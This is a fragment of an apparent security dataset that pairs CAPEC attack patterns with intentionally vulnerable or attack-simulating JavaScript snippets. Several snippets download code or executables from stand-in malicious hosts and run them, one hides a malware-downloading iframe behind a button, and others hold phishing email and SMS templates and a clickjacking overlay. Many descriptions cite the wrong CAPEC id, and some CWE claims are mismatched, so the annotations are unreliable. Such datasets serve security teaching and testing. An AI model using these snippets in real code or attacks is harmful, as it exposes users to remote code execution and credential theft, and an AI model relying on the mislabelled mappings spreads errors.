        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and forwards them to a target URL specified in the query parameters. The server fetches the content from the target URL and returns it to the client. This code embodies the main idea of CAPEC-225 (Infrastructure Manipulation) by demonstrating how an attacker could manipulate the routing of network messages. The code does not properly ensure that it is communicating with the correct endpoint (CWE-923), does not enforce message integrity (CWE-924), and exposes sensitive information by forwarding requests without validation (CWE-497). This could allow an attacker to redirect traffic to a malicious server, potentially capturing sensitive information."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<form action=\"/purchase\" method=\"POST\">\n  <input type=\"hidden\" name=\"item_id\" value=\"12345\">\n  <input type=\"hidden\" name=\"price\" value=\"100\">\n  <input type=\"hidden\" name=\"quantity\" value=\"1\">\n  <input type=\"submit\" value=\"Buy Now\">\n</form>\n\n<script>\n  // Simulating an attacker modifying the hidden fields\n  document.querySelector('input[name=\"price\"]').value = '1';\n  document.querySelector('input[name=\"quantity\"]').value = '10';\n</script>\n\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a vulnerable e-commerce form where hidden fields are used to store item price and quantity. The form submits these values to the server for processing. The JavaScript code simulates an attacker modifying the hidden 'price' and 'quantity' fields before submission, exploiting the server's reliance on client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'External Control of Assumed-Immutable Web Parameter' (CWE-472). The server should not trust client-side data and must validate and enforce security on the server side."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "const trustedDomain = 'https://trusted.example.com';\nconst userEmail = 'user@example.com';\n\nfunction sendPhishingEmail() {\n  const phishingLink = `https://malicious.example.com?redirect=${encodeURIComponent(trustedDomain)}`;\n  const emailContent = `Dear ${userEmail},\n\nWe noticed unusual activity in your account. Please verify your information by clicking the link below:\n\n<a href=\"${phishingLink}\" target=\"_blank\">Verify Now</a>\n\nThank you,\nTrusted Support Team`;\n  sendEmail(userEmail, 'Account Verification Required', emailContent);\n}\n\nfunction sendEmail(to, subject, body) {\n  // Simulate sending an email\n  console.log(`Sending email to: ${to}\nSubject: ${subject}\nBody:\n${body}`);\n}\n\nsendPhishingEmail();",
        "description": "This JavaScript code snippet simulates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted entity and contains a link that redirects the user to a malicious site. The link uses URL redirection (CWE-601) to make the phishing attempt more convincing. The email content is personalized with the user's email address to increase the likelihood of the user clicking the link. This code embodies the main idea of CAPEC-163 (Spear Phishing) by targeting a specific user with a tailored phishing email."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "const sendPhishingSMS = (phoneNumber) => {\n  const phishingLink = 'http://malicious-site.com/login';\n  const message = `Dear user, your account has been compromised. Please visit ${phishingLink} to secure your account.`;\n  // Simulate sending SMS\n  console.log(`Sending SMS to ${phoneNumber}: ${message}`);\n};\n\nconst simulateUserInteraction = (userInput) => {\n  const fakeLogin = (username, password) => {\n    console.log(`Captured credentials - Username: ${username}, Password: ${password}`);\n  };\n\n  // Simulate user visiting the phishing link and entering credentials\n  if (userInput === 'visitLink') {\n    fakeLogin('user123', 'password123');\n  }\n};\n\n// Example usage\nsendPhishingSMS('+1234567890');\nsimulateUserInteraction('visitLink');",
        "description": "This JavaScript code snippet demonstrates a mobile phishing attack. The `sendPhishingSMS` function simulates sending a phishing SMS to a user's phone number, containing a link to a malicious website. The `simulateUserInteraction` function simulates the user visiting the phishing link and entering their credentials, which are then captured by the attacker. This code embodies the main idea of the CAPEC by illustrating how an attacker might target mobile users with a phishing SMS to solicit sensitive information. The related CWEs are represented by the spoofed message (CWE-451), the capture of credentials (CWE-290), and the use of a password system for authentication (CWE-309)."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  const basePath = '/var/www/app/data/';\n  const filePath = path.join(basePath, userInput);\n\n  if (!filePath.startsWith(basePath)) {\n    throw new Error('Path traversal attempt detected!');\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a potential file manipulation vulnerability, specifically focusing on CWE-22 (Path Traversal). The `readFile` function takes user input to construct a file path and reads the file's content. The `path.join` method is used to concatenate the base path with user input, but without proper validation, this can lead to path traversal attacks. The code attempts to mitigate this by checking if the constructed file path starts with the base path, throwing an error if it doesn't. However, this simplistic check can be bypassed with certain inputs, illustrating the vulnerability. This snippet embodies the main idea of CAPEC-176 (File Manipulation) by showing how improper handling of file paths can lead to security issues."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "const systemConfig = { secureMode: true, userRole: 'admin' }; \n\nfunction resetSystem() { \n  // CWE-306: Missing Authentication for Critical Function\n  // No authentication check before resetting the system\n  systemConfig.secureMode = false; \n  systemConfig.userRole = 'guest'; \n  console.log('System reset to default values.'); \n}\n\nfunction simulatePowerCycle() { \n  // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n  // Security settings are not re-initialized properly after reset\n  resetSystem(); \n  console.log('Power cycle simulated.'); \n}\n\n// Simulate an attacker forcing a system reset\nsimulatePowerCycle(); \nconsole.log('Current system configuration:', systemConfig);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can force the system to reset its values without proper authentication (CWE-306). The `resetSystem` function resets critical security settings (CWE-1271) without verifying the user's identity, setting `secureMode` to `false` and `userRole` to `guest`. The `simulatePowerCycle` function simulates a power cycle, which calls `resetSystem`, illustrating how an attacker might exploit this to revert the system to an insecure state. This embodies the CAPEC concept of forcing the system into a previous state to leverage potential weaknesses."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "const sensitiveData = 'Sensitive Information';\n\nfunction debugMode() {\n    console.log('Debug Mode Activated');\n    console.log('Sensitive Data:', sensitiveData);\n}\n\n// Simulate a condition where debug mode is activated at runtime\nif (process.env.DEBUG_MODE === 'true') {\n    debugMode();\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is exposed through a debug mode that can be activated at runtime. The `sensitiveData` variable holds sensitive information. The `debugMode` function, when called, logs this sensitive information to the console. The condition `if (process.env.DEBUG_MODE === 'true')` simulates the activation of debug mode based on an environment variable. This represents the CAPEC concept of White Box Reverse Engineering, where an attacker could discover sensitive information through analysis techniques. The related CWEs are illustrated by the improper management of sensitive data (CWE-1323), exposure of sensitive information (CWE-497), and the ability to activate debug logic at runtime (CWE-1313)."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a file with an ADS\nfunction createFileWithADS(filePath, streamName, data) {\n  const adsPath = `${filePath}:${streamName}`;\n  fs.writeFileSync(adsPath, data);\n  console.log(`ADS created at ${adsPath}`);\n}\n\n// Function to read data from an ADS\nfunction readADS(filePath, streamName) {\n  const adsPath = `${filePath}:${streamName}`;\n  if (fs.existsSync(adsPath)) {\n    const data = fs.readFileSync(adsPath, 'utf8');\n    console.log(`Data from ADS: ${data}`);\n  } else {\n    console.log('ADS not found');\n  }\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\ncreateFileWithADS(filePath, 'hiddenStream', 'Sensitive data hidden in ADS');\nreadADS(filePath, 'hiddenStream');",
        "description": "This JavaScript code snippet demonstrates how to create and read an Alternate Data Stream (ADS) on a file in a Windows NTFS file system. The `createFileWithADS` function creates an ADS by appending `:streamName` to the file path and writing data to it. The `readADS` function reads data from the specified ADS if it exists. This code embodies the main idea of CAPEC-180, which involves exploiting NTFS ADS to hide data from standard file system utilities. The related CWEs provide additional context, such as improper handling of ADS (CWE-69) and improper removal of sensitive information (CWE-212), which are relevant to the potential misuse of this functionality."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated sensitive information\nconst sensitiveInfo = {\n  adminPassword: 'superSecret123',\n  userEmails: ['user1@example.com', 'user2@example.com']\n};\n\n// Endpoint that exposes sensitive information\napp.get('/info', (req, res) => {\n  if (req.query.token === 'validToken') {\n    res.json(sensitiveInfo);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\n// Endpoint with observable behavioral discrepancy\napp.get('/status', (req, res) => {\n  if (req.query.debug === 'true') {\n    res.send('Debug mode enabled');\n  } else {\n    res.send('Service running');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints. The '/info' endpoint exposes sensitive information (e.g., admin password and user emails) if a valid token is provided, representing CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The '/status' endpoint exhibits observable behavioral discrepancies based on the 'debug' query parameter, representing CWE-205 (Observable Behavioral Discrepancy). This code embodies the main idea of CAPEC-170 (Footprinting) by allowing an adversary to probe and explore the target to identify sensitive information and behavioral discrepancies."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/?query=sensitiveInfo',\n  method: 'GET',\n  headers: {\n    'User-Agent': 'Mozilla/5.0'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response Headers:', res.headers);\n    console.log('Response Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to a web application, which is a common method used in web application fingerprinting. The request includes a sensitive query string, which is a vulnerability (CWE-598). The response headers and body are logged, potentially exposing sensitive system information (CWE-497, CWE-209). The code also highlights the excessive attack surface (CWE-1125) by making an unnecessary request that could be exploited. This snippet embodies the main idea of CAPEC-170 by probing the web application to gather information that could be used for further targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // CWE-95: Eval Injection\n    eval(input);\n}\n\nfunction main() {\n    // CWE-627: Dynamic Variable Evaluation\n    var userVarName = 'userInput';\n    window[userVarName] = 'alert(\"Hacked!\")';\n\n    // CWE-914: Improper Control of Dynamically-Identified Variables\n    processUserInput(window[userVarName]);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Variable Manipulation' and its related CWEs. The `processUserInput` function uses `eval` to execute user-provided input, which is a classic example of CWE-95 (Eval Injection). In the `main` function, a variable name is dynamically created and assigned a malicious script (CWE-627: Dynamic Variable Evaluation). This variable is then passed to the `processUserInput` function, which executes it without proper validation (CWE-914: Improper Control of Dynamically-Identified Variables). The code represents the main idea of the CAPEC by showing how user-controlled variables can be manipulated to execute arbitrary code, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var hiddenFrame = document.createElement('iframe');\n  hiddenFrame.style.display = 'none';\n  hiddenFrame.src = 'http://malicious-site.com/download-malware';\n  document.body.appendChild(hiddenFrame);\n});",
        "description": "This JavaScript code snippet demonstrates an action spoofing attack. When a user clicks on a button with the ID 'submitButton', they expect to submit a form or perform a benign action. However, the code creates a hidden iframe that initiates a request to a malicious site, which could download malware. This embodies the main idea of CAPEC-139 (Action Spoofing) by tricking the user into performing an unintended action. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) as the user interface misleads the user about the action being performed."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "const flashVars = new URLSearchParams(window.location.search);\nconst flashParam = flashVars.get('flashParam');\n\nif (flashParam) {\n  const flashObject = document.createElement('embed');\n  flashObject.setAttribute('src', 'vulnerable.swf');\n  flashObject.setAttribute('flashvars', `param=${flashParam}`);\n  document.body.appendChild(flashObject);\n}",
        "description": "This JavaScript code snippet demonstrates a Flash Parameter Injection vulnerability. It extracts a parameter from the URL query string and injects it into a Flash object embedded within an HTML document. The code does not validate or sanitize the input, allowing an attacker to inject malicious global parameters into the Flash file. This can lead to various security issues, such as cross-site scripting (XSS) or unauthorized actions within the Flash application. The related CWEs provide additional context on potential weaknesses, such as improper neutralization of special elements (CWE-1336) and permissive cross-domain policies (CWE-942), which can exacerbate the impact of this vulnerability."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst vm = require('vm');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const scriptUrl = queryObject.scriptUrl;\n\n  if (scriptUrl) {\n    http.get(scriptUrl, (response) => {\n      let scriptData = '';\n      response.on('data', (chunk) => { scriptData += chunk; });\n      response.on('end', () => {\n        try {\n          vm.runInThisContext(scriptData);\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('Script executed successfully');\n        } catch (e) {\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end('Script execution failed');\n        }\n      });\n    }).on('error', (e) => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Failed to retrieve script');\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No script URL provided');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters to extract a 'scriptUrl' parameter, which is expected to be a URL pointing to a JavaScript file. The server then retrieves the script from the provided URL and executes it using the 'vm' module's 'runInThisContext' method. This code embodies the main idea of CAPEC-242 (Code Inclusion) by demonstrating how an adversary could exploit a weakness to force arbitrary code to be retrieved from a remote location and executed. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is shown by importing and executing code from an external URL, CWE-506 (Embedded Malicious Code) is implied by the potential for the external script to contain malicious code, CWE-94 (Code Injection) is represented by the lack of input validation before executing the script, CWE-98 (PHP Remote File Inclusion) is analogous to the remote inclusion of a script in this JavaScript context, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) is demonstrated by the unrestricted execution of the retrieved script."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable configuration file path\nconst configFilePath = '/etc/app/config.json';\n\n// Function to read and parse configuration file\nfunction getConfig() {\n  try {\n    const configData = fs.readFileSync(configFilePath, 'utf8');\n    return JSON.parse(configData);\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n    return null;\n  }\n}\n\n// Function to update configuration file\nfunction updateConfig(newConfig) {\n  try {\n    fs.writeFileSync(configFilePath, JSON.stringify(newConfig, null, 2), 'utf8');\n    console.log('Configuration updated successfully.');\n  } catch (err) {\n    console.error('Error writing configuration file:', err);\n  }\n}\n\n// Example usage\nconst config = getConfig();\nif (config) {\n  // External control of system setting\n  config.debugMode = true; // CWE-1234: Enabling debug mode can bypass protections\n  updateConfig(config);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable configuration manipulation scenario. It reads and updates a configuration file located at '/etc/app/config.json'. The 'getConfig' function reads and parses the configuration file, while the 'updateConfig' function writes new configuration data back to the file. The example usage shows how an attacker could enable a debug mode (CWE-1234), which could bypass system protections. This embodies the main idea of CAPEC-15, where an attacker manipulates external configuration files to affect the application's behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configName) {\n  const directories = ['/etc/app/', './user_configs/'];\n  for (const dir of directories) {\n    const filePath = path.join(dir, configName);\n    if (fs.existsSync(filePath)) {\n      return fs.readFileSync(filePath, 'utf8');\n    }\n  }\n  throw new Error('Config file not found');\n}\n\n// Usage\ntry {\n  const config = loadConfig('config.json');\n  console.log('Config loaded:', config);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker can exploit the file location algorithm to load a malicious file. The `loadConfig` function attempts to load a configuration file named `config.json` from a list of directories. The directories are searched in order, and the first matching file is loaded. If an attacker places a malicious `config.json` file in the `./user_configs/` directory, it will be loaded instead of the legitimate file in `/etc/app/`. This embodies the CAPEC idea of creating files with the same name as protected files and placing them in a directory that is searched first. The related CWEs are represented by the reliance on file names and paths, and the potential for external control over these paths."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "const flashUrl = 'http://trusted-site.com/flash.swf?redirect=' + encodeURIComponent(window.location.href);\nconst iframe = document.createElement('iframe');\niframe.src = flashUrl;\ndocument.body.appendChild(iframe);",
        "description": "This JavaScript code snippet demonstrates a potential Cross-Site Flashing vulnerability. It constructs a URL to a Flash file hosted on a trusted site, appending the current page's URL as a parameter. The Flash file could then use this parameter to reference external URLs, potentially leading to malicious content being executed. The code creates an iframe element and sets its source to the constructed URL, embedding the Flash file in the page. This example highlights the risk of URL redirection to untrusted sites (CWE-601) and the potential for improper neutralization of input (CWE-79) when user-controllable input is used in constructing URLs for Flash content."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "const sensitiveData = 'user=admin&password=secret';\nfetch(`http://example.com/api/getData?${sensitiveData}`, {\n  method: 'GET',\n  credentials: 'include'\n})\n.then(response => response.json())\n.then(data => {\n  document.getElementById('content').innerHTML = data.content;\n})\n.catch(error => console.error('Error:', error));\n\n// Storing sensitive data in a cookie\ndocument.cookie = `sessionToken=${sensitiveData}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT;`;\n\n// Storing sensitive file under web root\nconst fs = require('fs');\nfs.writeFileSync('/var/www/html/sensitive.txt', sensitiveData);",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly' and the associated CWEs. The code makes a GET request to a micro-service endpoint, including sensitive information in the query string (CWE-598). It also uses persistent cookies to store sensitive information (CWE-539). Additionally, it stores a file containing sensitive data under the web root directory (CWE-219). These practices expose the micro-services to potential exploitation by attackers who can discover and query these services, thereby gathering information about their implementation and function."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check user role\nfunction checkUserRole(req, res, next) {\n  if (req.user && req.user.role === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Incorrectly configured access control\napp.get('/admin', (req, res) => {\n  // Missing checkUserRole middleware\n  res.send('Welcome to the admin panel');\n});\n\n// Correctly configured access control\napp.get('/secure-admin', checkUserRole, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates an incorrectly configured access control scenario where an admin route (`/admin`) does not have the necessary middleware (`checkUserRole`) to verify if the user has admin privileges. This allows unauthorized users to access the admin panel, embodying the main idea of the CAPEC: 'Exploiting Incorrectly Configured Access Control Security Levels'. The code also includes a correctly configured access control route (`/secure-admin`) to show the proper way to protect sensitive functionality. This example highlights CWE-732 (Incorrect Permission Assignment for Critical Resource) by showing how missing access control checks can lead to unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "/* Vulnerable Code Example: Flash File Overlay for Clickjacking */\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            z-index: 10;\n            opacity: 0;\n        }\n    </style>\n</head>\n<body>\n    <iframe src=\"https://trusted-site.com\" width=\"100%\" height=\"100%\"></iframe>\n    <div id=\"overlay\">\n        <object type=\"application/x-shockwave-flash\" data=\"malicious.swf\" width=\"100%\" height=\"100%\"></object>\n    </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates a clickjacking attack using a Flash file overlay. The HTML page contains an iframe that loads content from a trusted site. A transparent div with an embedded Flash object (malicious.swf) is placed on top of the iframe. The Flash object intercepts user actions, such as clicks, intended for the underlying iframe content. This example embodies the CAPEC 'Flash File Overlay' attack and highlights related CWEs such as 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) and 'Permissive Cross-domain Policy with Untrusted Domains' (CWE-942). The Flash object can be used to perform actions on behalf of the user without their knowledge, representing a significant security risk."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(url) {\n  if (!url.endsWith('.swf')) {\n    throw new Error('Invalid file type');\n  }\n  var flashObject = document.createElement('object');\n  flashObject.data = url;\n  document.body.appendChild(flashObject);\n}\n\n// Example usage\nvar userProvidedUrl = 'http://example.com/malicious.swf';\nloadFlashContent(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function `loadFlashContent` that loads a Flash object from a given URL. The function attempts to validate the input by checking if the URL ends with '.swf', but this validation is insufficient and can be bypassed. An attacker can exploit this by providing a malicious URL that points to a harmful Flash file, leading to the execution of malicious Flash content. This embodies the main idea of the CAPEC 'Flash Injection' by showing how improper input validation (CWE-20) and an incomplete list of disallowed inputs (CWE-184) can lead to security vulnerabilities. The code also highlights the risk of embedded malicious code (CWE-506) and the potential for permissive cross-domain policies (CWE-942) if the Flash content interacts with untrusted domains."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst net = require('net');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const email = queryObject.email;\n  const command = `FETCH ${email}`;\n\n  const client = new net.Socket();\n  client.connect(143, 'imap.example.com', () => {\n    client.write(command);\n  });\n\n  client.on('data', (data) => {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(data);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Server Error');\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP server that listens for incoming requests. It extracts the 'email' parameter from the query string and constructs an IMAP command using this parameter. The command is then sent to an IMAP server. The response from the IMAP server is sent back to the client. This code is vulnerable to IMAP/SMTP command injection (CAPEC-138) because it does not properly sanitize the 'email' parameter, allowing an attacker to inject arbitrary IMAP commands. The code also demonstrates related weaknesses such as improper neutralization of special elements (CWE-77), improper encoding or escaping of output (CWE-116), and exposure of information through shell error messages (CWE-535)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious-code.js', (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download code');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('downloaded-code.js', data, (err) => {\n      if (err) {\n        console.error('Failed to save code');\n        return;\n      }\n      console.log('Code downloaded and saved. Executing...');\n      require('./downloaded-code.js');\n    });\n  });\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a software integrity attack by downloading and executing code from a remote location without verifying its origin or integrity (CWE-494). The code uses the 'http' module to fetch a JavaScript file from a specified URL and saves it to the local filesystem. It then immediately executes the downloaded code using 'require', which could potentially contain embedded malicious code (CWE-506). This represents a significant security risk as it allows an attacker to modify the target's software integrity, leading to an insecure state. The code does not include any checks to ensure the downloaded code is from a trusted source or has not been tampered with, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "const downloadAndExecute = (url) => {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Download failed:', error));\n};\n\n// Example usage\nconst maliciousUrl = 'http://malicious.example.com/malicious.js';\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a given URL without performing any integrity checks. The `fetch` function is used to download the code as text, and the `eval` function is used to execute the downloaded code. This embodies the main idea of CAPEC-193 (Malicious Software Download) by showing how an attacker could use deceptive methods to cause a user or an automated process to download and execute dangerous code from an attacker-controlled source. The use of `eval` without verifying the origin and integrity of the code directly relates to CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst downloadUpdate = (url, dest, cb) => {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(cb);\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    if (cb) cb(err.message);\n  });\n};\n\ndownloadUpdate('http://malicious-site.com/update.exe', 'update.exe', (err) => {\n  if (err) {\n    console.error('Download failed:', err);\n  } else {\n    console.log('Update downloaded successfully.');\n    require('child_process').exec('update.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Execution error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.log(`stderr: ${stderr}`);\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads an update from a specified URL and executes it without verifying the origin or integrity of the downloaded file. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user into downloading and running malicious code. The code also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check) by not verifying the downloaded file, CWE-506 (Embedded Malicious Code) by potentially downloading malicious code, and CWE-507 (Trojan Horse) by executing code that could contain hidden malicious functionality."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nfunction downloadUpdate(url, dest, cb) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(cb);\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    if (cb) cb(err.message);\n  });\n}\n\n// URL of the update server (potentially malicious)\nconst updateUrl = 'http://malicious-server.com/update.exe';\nconst destination = '/path/to/update.exe';\n\ndownloadUpdate(updateUrl, destination, (err) => {\n  if (err) {\n    console.error('Download failed:', err);\n  } else {\n    console.log('Update downloaded successfully');\n    // Execute the downloaded update without integrity check\n    require('child_process').exec(destination, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Execution error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The `downloadUpdate` function downloads an update from a specified URL and saves it to a destination path. The URL used in this example points to a potentially malicious server. The code does not perform any integrity checks on the downloaded file, nor does it authenticate the server, making it susceptible to attacks described in CAPEC-494 and CAPEC-807. After downloading, the code executes the update without verifying its authenticity, which could lead to the execution of malicious code. This snippet embodies the main idea of CAPEC-494 and related CWEs by highlighting the lack of proper authentication and integrity checks in the update process."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nfunction encrypt(data) {\n  const cipher = crypto.createCipher('des', 'weakpassword');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Exposing sensitive system information (CWE-497)\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// Undocumented feature (CWE-1242)\nfunction undocumentedFeature() {\n  console.log('This is an undocumented feature!');\n}\n\n// Main function demonstrating reverse engineering vulnerability\nfunction main() {\n  const sensitiveData = 'Sensitive Information';\n  const encryptedData = encrypt(sensitiveData);\n  console.log('Encrypted Data:', encryptedData);\n\n  const systemInfo = getSystemInfo();\n  console.log('System Info:', systemInfo);\n\n  undocumentedFeature();\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to reverse engineering. The `encrypt` function uses a weak cryptographic algorithm (DES) with a hardcoded password, making it susceptible to attacks (CWE-327). The `getSystemInfo` function exposes sensitive system information, such as the operating system and memory usage, to unauthorized actors (CWE-497). The `undocumentedFeature` function represents an undocumented feature that could be exploited by attackers (CWE-1242). The `main` function ties these elements together, showcasing how an adversary could reverse engineer the code to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function authenticate(userInput) {\n  const secretToken = 's3cr3t';\n  let isAuthenticated = false;\n  if (userInput === secretToken) {\n    isAuthenticated = true;\n  }\n  console.log(isAuthenticated ? 'Access granted' : 'Access denied');\n  return isAuthenticated;\n}\n\n// Simulate power consumption logging\nfunction logPowerConsumption() {\n  const powerConsumption = Math.random() * 100;\n  console.log(`Power consumption: ${powerConsumption}W`);\n}\n\n// Example usage\nconst userInput = 'userInputToken';\nauthenticate(userInput);\nlogPowerConsumption();",
